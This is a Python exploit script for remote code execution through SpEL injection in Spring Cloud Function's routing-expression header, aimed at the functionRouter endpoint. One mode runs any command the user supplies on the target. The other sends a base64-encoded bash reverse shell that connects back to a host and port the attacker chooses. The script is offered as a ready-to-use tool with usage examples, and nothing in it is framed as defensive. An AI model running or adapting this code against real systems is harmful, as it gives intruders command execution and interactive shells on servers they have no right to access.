import requests
import sys
import base64
import time


def run_rce(url, command):
	headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(command)
	}
	requests.post(url=url, headers=headers)
	print(time.asctime( time.localtime(time.time()))+"Command execution completed")


def get_shell(url, rhost, rport):
	shell = "bash -i >& /dev/tcp/{}/{} 0>&1".format(rhost,rport)
	shellcode = "bash -c {echo,"+base64.b64encode(shell.encode('utf-8')).decode('utf-8')+"}|{base64,-d}|{bash,-i}"
	headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(shellcode)
	}
	requests.post(url=url, headers=headers)
	print(time.asctime( time.localtime(time.time()))+" Bounce shell done")



if __name__ == '__main__':

	print("""
How to use: python3 springcloudRCE.py -u url -c command/-r rhost rport
Such as:
python3 springcloudRCE.py -u http://127.0.0.1:8080 -c "ping google.com"
python3 springcloudRCE.py -u http://127.0.0.1:8080 -r rport roast
	""")

	try:

		if "-u" not in sys.argv:
			exit(0)
		url = "{}//functionRouter".format(sys.argv[sys.argv.index("-u")+1])

		if "-c" in sys.argv:
			command = sys.argv[sys.argv.index("-c")+1]
			run_rce(url, command)
		elif "-r" in sys.argv:
			rhost = sys.argv[sys.argv.index("-r")+1]
			rport = sys.argv[sys.argv.index("-r")+2]
			get_shell(url, rhost, rport)
		else:
			exit(1)
			
	except BaseException as e:
		print("Parameter error",e)
		exit(2)
